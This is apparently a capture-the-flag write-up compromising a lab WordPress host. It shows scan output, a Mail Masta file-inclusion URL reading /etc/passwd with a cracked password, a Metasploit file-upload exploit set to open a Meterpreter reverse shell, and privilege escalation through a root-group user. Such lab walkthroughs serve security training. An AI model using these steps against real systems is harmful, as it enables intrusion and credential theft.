#  box writeup



## Ports open
```
Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-09 17:44 EAT
Nmap scan report for 192.168.232.23
Host is up (0.29s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds

```

## Bruteforcing directories
```

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, html, txt, zip | HTTP method: GET | Threads: 30 | Wordlist size: 27311

Output File: /media/xubzero/STUFF/mytools/dirsearch/reports/192.168.232.23/-_22-01-09_17-45-01.txt

Error Log: /media/xubzero/STUFF/mytools/dirsearch/logs/errors-22-01-09_17-45-01.log

Target: http://192.168.232.23/

[17:45:02] Starting: 
[17:47:47] 403 -  279B  - /icons/     (Added to queue)
[17:47:52] 200 -   11KB - /index.html
[17:47:53] 200 -   14B  - /info.php
[17:48:02] 403 -  279B  - /javascript/     (Added to queue)
[17:48:02] 301 -  321B  - /javascript  ->  http://192.168.232.23/javascript/
[17:48:43] 200 -   28B  - /notes.txt
[17:50:07] 200 -  261B  - /secret.zip
[17:50:14] 403 -  279B  - /server-status
[17:50:15] 403 -  279B  - /server-status/     (Added to queue)
[17:51:37] 301 -  320B  - /wordpress  ->  http://192.168.232.23/wordpress/     (Added to queue)
[17:51:40] 200 -   48KB - /wordpress/
[17:51:55] Starting: icons/
[17:52:18] 200 -    5KB - /icons/README
[17:52:19] 200 -   35KB - /icons/README.html
[17:57:15] 403 -  279B  - /icons/small/     (Added to queue)
[17:57:15] 301 -  322B  - /icons/small  ->  http://192.168.232.23/icons/small/
[17:58:24] Starting: javascript/
[18:01:40] 403 -  279B  - /javascript/jquery/     (Added to queue)
[18:01:40] 301 -  328B  - /javascript/jquery  ->  http://192.168.232.23/javascript/jquery/
[18:06:03] Starting: server-status/
[18:13:20] Starting: wordpress/
[18:16:14] 301 -    0B  - /wordpress/index.php  ->  http://192.168.232.23/wordpress/
[18:16:52] 200 -   19KB - /wordpress/license.txt
[18:18:13] 200 -    7KB - /wordpress/readme.html
[18:20:05] 301 -  329B  - /wordpress/wp-admin  ->  http://192.168.232.23/wordpress/wp-admin/     (Added to queue)
[18:20:05] 302 -    0B  - /wordpress/wp-admin/  ->  http://192.168.232.23/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.232.23%2Fwordpress%2Fwp-admin%2F&reauth=1
[18:20:06] 200 -    0B  - /wordpress/wp-blog-header.php
[18:20:06] 200 -    0B  - /wordpress/wp-content/     (Added to queue)
[18:20:06] 200 -    0B  - /wordpress/wp-config.php
[18:20:06] 301 -  331B  - /wordpress/wp-content  ->  http://192.168.232.23/wordpress/wp-content/
[18:20:06] 200 -    0B  - /wordpress/wp-cron.php
[18:20:06] 301 -  332B  - /wordpress/wp-includes  ->  http://192.168.232.23/wordpress/wp-includes/     (Added to queue)
[18:20:06] 200 -  234B  - /wordpress/wp-links-opml.php
[18:20:07] 200 -    0B  - /wordpress/wp-load.php
[18:20:07] 403 -    3KB - /wordpress/wp-mail.php
[18:20:07] 200 -   10KB - /wordpress/wp-login.php
[18:20:07] 500 -    0B  - /wordpress/wp-settings.php
[18:20:07] 302 -    0B  - /wordpress/wp-signup.php  ->  http://192.168.232.23/wordpress/wp-login.php?action=register
[18:20:07] 200 -   44KB - /wordpress/wp-includes/
[18:20:07] 200 -  135B  - /wordpress/wp-trackback.php
[18:20:11] 405 -   42B  - /wordpress/xmlrpc.php
[18:20:17] Starting: icons/small/
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue / [n]ext: n
[18:20:29] Starting: javascript/jquery/

```

## Reading notes.txt
```
You Need to ZIP Your Wayout
```



## WPSCAN - Possible Vulnerabilities
```
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Search Block
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 | [!] Title: WordPress <= 5.2.3 - Hardening Bypass
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 | [!] Title: Gwolle Guestbook <= 1.5.3 - Remote File Inclusion (RFI)
 | [!] Title: Gwolle Guestbook <= 2.1.0 - Cross-Site Request Forgery (CSRF)
 | [!] Title: Gwolle Guestbook <= 2.1.0 - Unauthenticated Stored Cross-Site Scripting (XSS) 
 | [!] Title: Gwolle Guestbook <= 2.5.3 - Cross-Site Scripting (XSS)
 | [!] Title: Gwolle Guestbook < 4.2.0 - Reflected Cross-Site Scripting
 | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
 | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
 | [!] Title: Reflex Gallery <= 3.1.3 - Arbitrary File Upload
 | [!] Title: Multiple Plugins - jQuery prettyPhoto DOM Cross-Site Scripting (XSS)
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 | [!] Title: Slideshow Gallery < 1.4.7 - Arbitrary File Upload
 | [!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS) 
 | [!] Title: Tribulant Slideshow Gallery <= 1.6.4 - Authenticated Cross-Site Scripting (XSS)
 | [!] Title: Slideshow Gallery <= 1.6.5 - Multiple Authenticated Cross-Site Scripting (XSS)
 | [!] Title: Slideshow Gallery <= 1.6.8 - XSS and SQLi
 | [!] Title: Slideshow Gallery < 1.7.4 - Admin+ Stored Cross-Site Scripting
 | [!] Title: EasyCart <= 3.0.15 - Unrestricted File Upload
 | [!] Title: EasyCart 1.1.30 - 3.0.20 - Privilege Escalation
 | [!] Title: Shopping Cart & eCommerce Store < 5.1.1 - CSRF to Stored Cross-Site Scripting
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution (RCE)
 | [!] Title: WP Support Plus Responsive Ticket System < 9.0.3 - Multiple Authenticated SQL Injection
 | [!] Title: WP Support Plus Responsive Ticket System < 9.1.2 - Stored XSS
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution
 | [!] Title: WP Symposium 13.04 - Unvalidated Redirect
 | [!] Title: WP Symposium <= 12.07.07 - Authentication Bypass
 | [!] Title: WP Symposium <= 14.11 - Unauthenticated Shell Upload
 | [!] Title: WP Symposium <= 15.1 - SQL Injection
 | [!] Title: WP Symposium <=  15.5.1 - Unauthenticated SQL Injection
 | [!] Title: WP Symposium <= 15.1 - Blind SQL Injection
 | [!] Title: WP Symposium <= 15.8.1 - Unauthenticated Reflected Cross-Site Scripting (XSS)


```

## Local File Inclusion ( Mail Masta)
Mail masta plugin has a local file inclusion vulnerability <br/>
Url : http://192.168.232.23/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Reading /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash

```
Cracking the password for hacker user
```
user: hacker
password: pass123
```


## Metasploit Exploit - SQL Injection - admin/http/wp_symposium_sql_injection
```
[+] 192.168.209.23:80 - admin           $P$BYWgfD7pa572QS9YFoeVVmhrIhBAx0. abc@gmail.com
```

## Metasploit Exploit - RCE - exploit/unix/webapp/wp_reflexgallery_file_upload
```

Module options (exploit/unix/webapp/wp_reflexgallery_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.232.23   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wordpress       yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.49.232   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Reflex Gallery 3.1.3

```

### Uploading a recon script
```


```

### Searching for files in the /var/www/html/ directory
```
/var/www/html/
/var/www/html/wordpress
/var/www/html/wordpress/license.txt
/var/www/html/wordpress/readme.html
/var/www/html/wordpress/wp-signup.php
/var/www/html/wordpress/wp-includes
/var/www/html/wordpress/wp-includes/class-wp-query.php
/var/www/html/wordpress/wp-includes/functions.php
/var/www/html/wordpress/wp-includes/class-wp-customize-control.php
/var/www/html/wordpress/wp-includes/class-snoopy.php
/var/www/html/wordpress/wp-includes/theme.php
/var/www/html/wordpress/wp-includes/class-wp-widget-factory.php
/var/www/html/wordpress/wp-includes/class-wp-session-tokens.php
/var/www/html/wordpress/wp-includes/formatting.php
/var/www/html/wordpress/wp-includes/class-wp-customize-widgets.php
/var/www/html/wordpress/wp-includes/nav-menu.php
/var/www/html/wordpress/wp-includes/class-wp-user-query.php
/var/www/html/wordpress/wp-includes/post.php

		-------More FIles --- 

/var/www/html/wordpress/wp-blog-header.php
/var/www/html/wordpress/wp-cron.php
/var/www/html/wordpress/wp-config-sample.php
/var/www/html/wordpress/wp-trackback.php
/var/www/html/wordpress/wp-comments-post.php
/var/www/html/wordpress/wp-login.php
/var/www/html/index.html
/var/www/html/info.php
/var/www/html/notes.txt
/var/www/html/secret.zip
```

### Searching for files in the home folder
```
/home
/home/raj
/home/raj/Documents
/home/raj/.config
/home/raj/Music
/home/raj/Templates
/home/raj/local.txt
/home/raj/examples.desktop
/home/raj/.cache
/home/raj/.ICEauthority
/home/raj/.bashrc
/home/raj/.sudo_as_admin_successful
/home/raj/Videos
/home/raj/flag1.txt
/home/raj/.profile
/home/raj/.gnupg
/home/raj/Downloads
/home/raj/Pictures
/home/raj/.bash_history
/home/raj/.gvfs
/home/raj/.bash_logout
/home/raj/.mysql_history
/home/raj/Public
/home/raj/plugin
/home/raj/plugin/78745b48b15bf2b81153556ef1c8ec48-mail-masta.zip
/home/raj/plugin/5be8270e880c445e11c59597497468bb-site-editor.zip
/home/raj/plugin/0e2dbc60f9c9522ebf2a62de1b1f7280-slideshow-gallery.1.4.6.zip
/home/raj/plugin/6f5605b37286f18941f975226c536195-dompdf-0.6.0.zip
/home/raj/plugin/2e1f384e5e49ab1d5fbf9eedf64c9a15-plainview-activity-monitor.20161228.zip
/home/raj/plugin/b5087bf1aa04bc58ce95080cccb879b2-gwolle-gb.1.5.3.zip
/home/raj/.dbus
/home/raj/.local
/home/raj/.mozilla
/home/raj/.ssh
/home/raj/Desktop

```
### Reading flag1.txt
```
Your flag is in another file...
```

### Reading local.txt
```
13b02e38a6572387e2c55b546d415006
```

### Finding suid binaries
find / -perm -u=s -type f 2>/dev/null
```
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/arping
/usr/bin/wget
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/vmware-user-suid-wrapper
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/cp
/bin/su

```

### Priviledge Escalation
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
/bin/bash

```
Method 1
```
hacker belongs to root group

su hacker 

cat /root/proof.txt
```
